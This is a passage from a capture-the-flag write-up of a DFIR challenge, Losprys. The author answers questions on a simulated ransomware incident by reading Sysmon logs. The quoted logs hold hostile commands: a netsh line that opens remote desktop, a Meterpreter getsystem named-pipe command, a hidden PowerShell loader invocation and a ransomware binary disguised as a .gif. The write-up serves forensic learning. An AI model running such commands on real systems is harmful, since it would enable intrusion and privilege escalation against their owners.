<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CommandLine&quot;</span>&gt;</span>netsh  advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=Yes<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CurrentDirectory&quot;</span>&gt;</span>C:\Windows\system32\\<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;IntegrityLevel&quot;</span>&gt;</span>System<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentImage&quot;</span>&gt;</span>C:\Windows\SysWOW64\cmd.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">EventData</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Event</span>&gt;</span>
</code></pre>
<p>It confirmed my guess to me. I tried it and it turned out that I was right.</p>
<h4 id="q24-when-based-on-the-sysmon-logs-did-the-attacker-first-attempt-to-escalate-their-priviledges-by-running-getsystem-via-meterpreter-on-the-host-give-you-answer-in-utc-time-in-the-following-format-yyyy-mm-dd-hhmmss">Q24) When, based on the Sysmon logs, did the attacker first attempt to escalate their priviledges by running &quot;&quot;GetSystem&quot;&quot; via Meterpreter on the host? Give you answer in UTC time in the following format: yyyy-mm-dd hh:mm:ss</h4>
<p>Once I found <a href="https://redcanary.com/blog/getsystem-offsec/" target="_blank">an interesting documentation</a>, I understood that <code>\\.\pipe\</code> is the core of this payload used by Meterpreter to escalate privileges. Thus, I dig in the logs with that filter and got this entry, with a coherent timestamp, which is the first attempt to escalate privileges:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TimeCreated</span> <span class="hljs-attr">SystemTime</span>=<span class="hljs-string">&quot;2021-07-23 14:24:37.857069&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TimeCreated</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Channel</span>&gt;</span>Microsoft-Windows-Sysmon/Operational<span class="hljs-tag">&lt;/<span class="hljs-name">Channel</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Computer</span>&gt;</span>fin-desktop<span class="hljs-tag">&lt;/<span class="hljs-name">Computer</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;UtcTime&quot;</span>&gt;</span>2021-07-23 14:24:37.855<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Description&quot;</span>&gt;</span>Windows Command Processor<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;OriginalFileName&quot;</span>&gt;</span>Cmd.Exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CommandLine&quot;</span>&gt;</span>cmd.exe /c echo nrjyqs <span class="hljs-symbol">&amp;gt;</span> \\.\pipe\nrjyqs<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
</code></pre>
<h4 id="q26-what-was-the-name-of-the-ransomware-executable-run-on-the-computer-which-was-likely-responsible-for-causing-the-users-data-to-be-encrypted">Q26) What was the name of the ransomware executable run on the computer which was likely responsible for causing the user’s data to be encrypted?</h4>
<p>I had nowhere to go here. I ended up scrolling, after the found timestamps, and bumped into a lot of <code>readme.txt</code> files. With my knowledge about malware analysis, I know that ransomwares drop readmes with ransom instruction for the infected computer users. Here is one of the log entry:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;Image&quot;</span>&gt;</span>c:\Windows\Temp\sys32.gif<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;TargetFilename&quot;</span>&gt;</span>C:\Users\Default\Favorites\readme.txt<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
</code></pre>
<p>The software <code>sys32.gif</code> seems to be responsible, let&apos;s search a bit more:</p>
<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CommandLine&quot;</span>&gt;</span>c:\Windows\Temp\sys32.gif<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;CurrentDirectory&quot;</span>&gt;</span>C:\Windows\system32\<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentImage&quot;</span>&gt;</span>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe<span class="hljs-tag">&lt;/<span class="hljs-name">Data</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Data</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;ParentCommandLine&quot;</span>&gt;</span>&quot;C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe&quot; -noni -nop -w hidden -c <span class="hljs-symbol">&amp;amp;</span>([scriptblock]::create((New-Object System.IO.StreamReader(
[...]
</code></pre>
<p>That is really relevant: it matches my guess as this executable launches the malicious payload we studied beforehand. Hence, it indeed made the user&apos;s data encrypted.</p>
<h4 id="q29-having-a-look-online-you-find-that-a-sample-was-submitted-in-may-2021-to-an-online-malware-sandbox-that-created-a-near-identical-ransom-note-as-the-transnet-one-what-was-the-name-of-the-of-company-as-shown-on-the-sandbox-samples-ransom-note">Q29) Having a look online, you find that a sample was submitted in May 2021 to an online malware sandbox that created a near identical ransom note as the Transnet one. What was the name of the of company as shown on the sandbox sample&apos;s ransom note?</h4>
<p>That directly rang a bell to me: the sandbox it is talking about is <a href="https://www.joesandbox.com/#windows" target="_blank">Joe Sandbox</a>, which is a great tool about deep malware analysis. I used my OSINT skills there to get more information and came upon <a href="https://securityaffairs.co/wordpress/120596/cyber-crime/transnet-soc-cyber-attack.html" target="_blank">this introduction article</a> regarding Transnet attack and <a href="https://www.joesandbox.com/analysis/410393/0/html" target="_blank">this analysis</a> from our great sandbox, which is dated May 2021. I notably had a look on created or dropped files and got an interesting preview:</p>
<pre><code class="lang-txt">&quot;Hello dear westernpathologyinc ! 
[...]
use TOR browser to talk with support&quot;
</code></pre>
<p>It seems that the company that is attacked here is <code>westernpathologyinc</code>. I had to be sure of me: I kept searching and came across <a href="https://id-ransomware.blogspot.com/2020/11/hellokitty-ransomware.html" target="_blank">this Russian analysis</a> that I naturally translated to English. I noticed this sentence:</p>
<pre><code class="lang-txt">&quot;In May 2021, a new version written in the Go language appeared&quot;
</code></pre>
<p>Once this read, I understood that in May 2021, another version was published as a ransomware. I submitted my first find and FLAG!</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../" class="navigation navigation-prev " aria-label="Previous page:   SocVel">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="dikbek.html" class="navigation navigation-next " aria-label="Next page: DikBek (DFIR, 3000)">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Losprys (DFIR, 3000)","level":"1.6.1","depth":2,"next":{"title":"DikBek (DFIR, 3000)","level":"1.6.2","depth":2,"path":"2021/SocVel/DFIR/dikbek.md","ref":"2021/SocVel/DFIR/dikbek.md","articles":[]},"previous":{"title":"  SocVel","level":"1.6","depth":1,"path":"2021/SocVel/README.md","ref":"2021/SocVel/README.md","articles":[{"title":"Losprys (DFIR, 3000)","level":"1.6.1","depth":2,"path":"2021/SocVel/DFIR/losprys.md","ref":"2021/SocVel/DFIR/losprys.md","articles":[]},{"title":"DikBek (DFIR, 3000)","level":"1.6.2","depth":2,"path":"2021/SocVel/DFIR/dikbek.md","ref":"2021/SocVel/DFIR/dikbek.md","articles":[]},{"title":"Pooptoria (DFIR, 3000)","level":"1.6.3","depth":2,"path":"2021/SocVel/DFIR/pooptoria.md","ref":"2021/SocVel/DFIR/pooptoria.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["mathjax@https://github.com/algorithm-archivists/plugin-mathjax"],"root":"./","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"mathjax":{"forceSVG":false,"version":"2.6.1"},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","honkit":">= 3.0.0","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"extiop's realm","gitbook":"*"},"file":{"path":"2021/SocVel/DFIR/losprys.md","mtime":"2024-09-13T00:20:45.337Z","type":"markdown"},"gitbook":{"version":"3.7.5","time":"2024-09-13T00:34:44.779Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <noscript>
        <style>
            .honkit-cloak {
                display: block !important;
            }
        </style>
    </noscript>
    <script>
        // Restore sidebar state as critical path for prevent layout shift
        function __init__getSidebarState(defaultValue){
            var baseKey = "";
            var key = baseKey + ":sidebar";
            try {
                var value = localStorage[key];
                if (value === undefined) {
                    return defaultValue;
                }
                var parsed = JSON.parse(value);
                return parsed == null ? defaultValue : parsed;
            } catch (e) {
                return defaultValue;
            }
        }
        function __init__restoreLastSidebarState() {
            var isMobile = window.matchMedia("(max-width: 600px)").matches;
            if (isMobile) {
                // Init last state if not mobile
                return;
            }
            var sidebarState = __init__getSidebarState(true);
            var book = document.querySelector(".book");
            // Show sidebar if it enabled
            if (sidebarState && book) {
                book.classList.add("without-animation", "with-summary");
            }
        }

        try {
            __init__restoreLastSidebarState();
        } finally {
            var book = document.querySelector(".book");
            book.classList.remove("honkit-cloak");
        }
    </script>
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-mathjax/plugin.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

